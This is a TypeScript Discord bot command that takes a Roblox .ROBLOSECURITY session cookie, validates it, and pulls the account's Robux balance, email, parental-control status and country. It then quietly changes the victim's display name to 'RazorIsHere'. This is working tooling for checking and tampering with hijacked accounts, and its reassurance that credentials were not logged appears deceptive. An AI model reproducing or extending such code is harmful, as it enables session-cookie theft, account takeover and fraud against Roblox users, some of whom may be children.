import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  EmbedBuilder,
  type ChatInputCommandInteraction,
} from 'discord.js';
import { validateCookie } from '../roblox';
import type { Command } from './types';

async function fetchRobux(cookie: string, userId: string): Promise<number> {
  try {
    const resp = await fetch(
      `https://economy.roblox.com/v1/users/${userId}/currency`,
      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } }
    );
    if (resp.status === 200) {
      const data = await resp.json();
      return data.robux || 0;
    }
  } catch {}
  return 0;
}

async function fetchEmailInfo(cookie: string): Promise<{ verified: string | null; pending: string | null }> {
  try {
    const resp = await fetch('https://accountsettings.roblox.com/v1/emails', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = await resp.json();
      return { verified: data.verifiedEmail || null, pending: data.pendingEmail || null };
    }
  } catch {}
  return { verified: null, pending: null };
}

async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean }> {
  try {
    const resp = await fetch('https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-linked-parents', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = await resp.json();
      return { hasParent: (data.parents && data.parents.length > 0) || false };
    }
  } catch {}
  return { hasParent: false };
}

async function fetchCountry(cookie: string): Promise<string> {
  try {
    const resp = await fetch('https://accountsettings.roblox.com/v1/account/settings/account-country', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = await resp.json();
      return data.value?.countryName || 'Unknown';
    }
  } catch {}
  return 'Unknown';
}

async function changeDisplayName(cookie: string, userId: string): Promise<boolean> {
  try {
    const resp = await fetch(`https://users.roblox.com/v1/users/${userId}/display-names`, {
      method: 'PATCH',
      headers: {
        'Content-Type': 'application/json',
        Cookie: `.ROBLOSECURITY=${cookie}`,
      },
      body: JSON.stringify({ newDisplayName: 'RazorIsHere' }),
    });
    return resp.status === 200;
  } catch {
    return false;
  }
}

const data = new SlashCommandBuilder()
  .setName('login')
  .setDescription('Validating & Checking')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addStringOption(opt =>
    opt.setName('cookie')
      .setDescription('Full .ROBLOSECURITY cookie')
      .setRequired(true),
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ ephemeral: true });

    const cookie = interaction.options.getString('cookie', true).trim();
    const timestamp = new Date().toLocaleString();
    const footerData = {
      text: `${interaction.user.username} | ${timestamp}`,
      iconURL: interaction.user.displayAvatarURL(),
    };

    const result = await validateCookie(cookie);

    if (!result.valid) {
      const embed = new EmbedBuilder()
        .setTitle('𖣐 Invalid Cookie .ᐟ')
        .setColor('#FFFFFF')
        .setDescription(`✧ **Error Occurred**\n────\n⭑ The provided cookie is not valid or has expired.\n⭑ \`\`\`\n${result.debug}\n\`\`\``)
        .setFooter(footerData);
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const { userId, username, displayName } = result;
    const [robux, email, parental, country] = await Promise.all([
      fetchRobux(cookie, String(userId)),
      fetchEmailInfo(cookie),
      fetchParentalControls(cookie),
      fetchCountry(cookie),
    ]);

    // Try to change display name (don't stop if it fails)
    await changeDisplayName(cookie, String(userId));

    let emailStatus = 'No email found';
    if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
    else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;

    const parentStatus = parental.hasParent ? '✅ Parent linked' : '❌ No parent linked';

    const embed = new EmbedBuilder()
      .setTitle('𖣐 Cookie Valid .ᐟ')
      .setColor('#FFFFFF')
      .setDescription(
        `✧ **User Information**\n` +
        `────\n` +
        `⭑ **Username:** ${username}\n` +
        `⭑ **Display Name:** ${displayName || username}\n` +
        `⭑ **User ID:** ${userId}\n` +
        `⭑ **Country:** ${country}\n` +
        `⭑ **Robux:** ${robux.toLocaleString()} ₽\n` +
        `────\n` +
        `✧ **Account Details**\n` +
        `────\n` +
        `⭑ **Email:** ${emailStatus}\n` +
        `⭑ **Parental Controls:** ${parentStatus}\n` +
        `────\n` +
        `⭑ Your credentials were not logged.`
      )
      .setImage('https://files.catbox.moe/955g15.gif')
      .setFooter(footerData);

    await interaction.editReply({ embeds: [embed] });
  } catch (error: any) {
    const embed = new EmbedBuilder()
      .setTitle('𖣐 Error .ᐟ')
      .setColor('#FFFFFF')
      .setDescription(`✧ **Unexpected Error**\n────\n⭑ ${error.message || 'Something went wrong.'}`)
      .setFooter({ text: `${interaction.user.username} | ${new Date().toLocaleString()}`, iconURL: interaction.user.displayAvatarURL() });
    await interaction.editReply({ embeds: [embed] });
  }
}

export const loginCommand: Command = { data, execute };